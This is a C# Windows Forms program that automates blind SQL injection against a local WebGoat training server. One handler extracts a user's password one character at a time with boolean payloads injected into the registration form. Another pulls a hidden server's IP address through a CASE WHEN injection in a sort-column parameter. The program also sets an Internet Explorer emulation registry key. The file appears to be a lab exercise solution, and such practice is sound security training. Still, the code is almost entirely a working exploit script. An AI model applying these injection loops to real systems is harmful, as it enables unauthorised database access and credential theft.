using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WebGoatFuzzer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            int BrowserVer, RegVal;

            // get the installed IE version
            using (WebBrowser Wb = new WebBrowser())
                BrowserVer = Wb.Version.Major;

            // set the appropriate IE version
            if (BrowserVer >= 11)
                RegVal = 11001;
            else if (BrowserVer == 10)
                RegVal = 10001;
            else if (BrowserVer == 9)
                RegVal = 9999;
            else if (BrowserVer == 8)
                RegVal = 8888;
            else
                RegVal = 7000;

            // set the actual key
            using (RegistryKey Key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION", RegistryKeyPermissionCheck.ReadWriteSubTree))
                if (Key.GetValue(System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe") == null)
                    Key.SetValue(System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe", RegVal, RegistryValueKind.DWord);


            wbWebGoat.Navigate("http://localhost:8080/WebGoat/");
        }

        private async void btnAdvanced_Click(object sender, EventArgs e)
        {
            wbWebGoat.Navigate("http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/4");

            await Task.Delay(1000);

            int curPosition = 1;
            string password = "";

            while (password.Length < 23)
            {
                int min = 0;
                int max = 127;
                int curChar = 63;

                while (max - min != 1)
                {
                    string query = $"tom' AND ASCII(SUBSTRING(password,{curPosition},1)) > {curChar} --";

                    wbWebGoat.Document.GetElementById("username").SetAttribute("value", query);
                    wbWebGoat.Document.GetElementById("email").SetAttribute("value", "abc@abc.com");
                    wbWebGoat.Document.GetElementById("password").SetAttribute("value", "123");
                    wbWebGoat.Document.GetElementById("confirm-password").SetAttribute("value", "123");

                    wbWebGoat.Document.GetElementById("register-submit").InvokeMember("click");

                    await Task.Delay(500);

                    bool created = false;
                    foreach (HtmlElement element in wbWebGoat.Document.All)
                    {
                        if (element.InnerText != null && element.InnerText.Contains("created"))
                        {
                            created = true;
                            break;
                        }
                    }
                    if (created)
                    {
                        max = curChar;
                        curChar = min + ((max - min) / 2);
                    }
                    else
                    {
                        min = curChar;
                        curChar = min + ((max - min) / 2);
                    }
                }

                password += Convert.ToChar(min + 1);
                txtPassword.Text = password;

                curPosition++;
            }
        }

        private async void btnMigitation_Click(object sender, EventArgs e)
        {
            char[] ipChars = { '1', '2', '3', '4', '5', '6', '7', '8', '9', '1', '0', '.' };
            string ipAddress = "";
            int curPosition = 1;

            while (curPosition < 16)
            {
                int curChar = 0;

                while (curChar < ipChars.Length)
                {
                    string url = $"http://localhost:8080/WebGoat/SqlInjection/servers?column=" +
                                 $"(case when exists(select id from servers where hostname='webgoat-prd' and " +
                                 $"substring(ip,{curPosition},1)='{ipChars[curChar]}') then ip else hostname end)";

                    wbWebGoat.Navigate(url);
                    await Task.Delay(500);

                    if (wbWebGoat.Document.Body.InnerText.StartsWith("[ {\r\n  \"id\" : \"2\""))
                    {
                        ipAddress += ipChars[curChar];
                        txtIP.Text = ipAddress;
                        break;
                    }

                    curChar++;
                }
                curPosition++;
            }
        }
    }
}
